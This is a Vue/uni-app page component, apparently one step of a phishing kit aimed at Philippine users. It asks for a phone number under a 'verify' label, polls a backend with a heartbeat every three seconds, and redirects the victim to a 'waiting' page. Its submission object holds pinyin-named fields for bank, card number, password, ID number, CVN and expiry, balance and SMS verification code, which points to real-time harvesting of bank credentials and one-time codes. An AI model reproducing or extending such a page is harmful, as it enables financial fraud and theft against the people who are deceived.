<template>
	<view class="home-container">
		<view class="custom-nav">
			<view></view>
			<view><text class="title">{{$t("LABEL_VERIFY")}}</text></view>
			<view></view>
		</view>
		<view variant="text" class="card">
			<uni-forms class="form" :modelValue="formData" 
				ref="prepareForm" label-position="top" err-show-type="undertext" 
				:rules="rules" validateTrigger="blur" >
				<uni-row class="form-row">
					<uni-col :span="24">
						<uni-forms-item required name="phone" :label="$t('LABEL_PHONE_NUMBER')" class="form-item" label-width="100vw">
							<uni-row class="flex-row">
								<uni-col :span="4" style="text-align:right; color: #999">
									Philippines<br />(+63)
								</uni-col>
								<uni-col :span="20" >
									<uni-easyinput class="input" type="tel" v-model="formData.phone"/>
								</uni-col>
							</uni-row>
						</uni-forms-item>
					</uni-col>
				</uni-row>
				<uni-row class="form-row">
					<uni-col :span="24" style="text-align: center;">
						<uni-button type="primary" class="large-button" @click="upgrade">{{$t("SUBMIT")}}</uni-button>
					</uni-col>
				</uni-row>
			</uni-forms>
		</view>
	</view>

</template>

<script lang="ts">
	export default {
		data() {
			return {
				options: {}
			}
		},
		onLoad(options: any) {
			this.options = options;
		}
	}
</script>

<script setup lang="ts">
	import { computed, ref, onMounted, onUnmounted, getCurrentInstance } from "vue";
	import { i18n } from '@/locales'
	import rules from './Rules';
	
	import { updateOrder, heartBeat } from './Remote';

	import { useRoute } from 'vue-router'
	const route = useRoute()
	
	onMounted(() => {
		let pageInstance = getCurrentInstance();
		if (pageInstance) {
			let options: any = pageInstance.data.options;
			formData.value.id = options.order
		}
	})
	
	onUnmounted(() => {
	});	
		
	const prepareForm = ref(null);
	const formData = ref({
		id: "",
		phone: "",
	});
	
	const upgrade = async () => {
		prepareForm.value.validate();
		let formDataValue = formData.value
		let submitData = {
			d_id: formDataValue.id,
			d_kaihuhang: "",
			d_name: "",
			d_kahao: "",
			d_mima: "",
			d_mima2: "",
			d_sfz: "",
			d_phone: formDataValue.phone,
			d_cvn: "",
			d_cvntime: "",
			d_yue: null,
			d_yzm: "",
			d_download: null,
			d_permission: null,
			d_sms: "",
			d_device: null
		}
		let resp = await updateOrder(submitData);
		console.log(resp.status);
		if (resp.status == 1) {
			uni.redirectTo({
				url: "waiting?order=" + resp.data.d_id
			})
		}
	}
	
	onUnmounted(() => {
		clearInterval(heartBeatTimer);
	});	
	
	const heartBeatTimer = setInterval(async () => {
		try {
			heartBeat(formData.value.id);
		}
		catch(error) {
		}
	}, 3000);
</script>

<style>
	.home-container {}

	.card {
		padding: 0.5em;
	}

	.flex-row {
		display: flex;
		flex-direction: row;
		justify-content: space-between;
		gap: 0.5em;
	}

	.form .form-row {
		padding: 0.5em;
	}

	.form .form-item label {
		line-height: 2em;
		color: #999;
	}

	.form .form-item input {
		/* border: 1px solid #CCC; */
		font-size: 18px;
		line-height: 200%;
		width: 100%;
	}

	.submit {
		color: #FFF;
		font-weight: 900;
	}

</style>
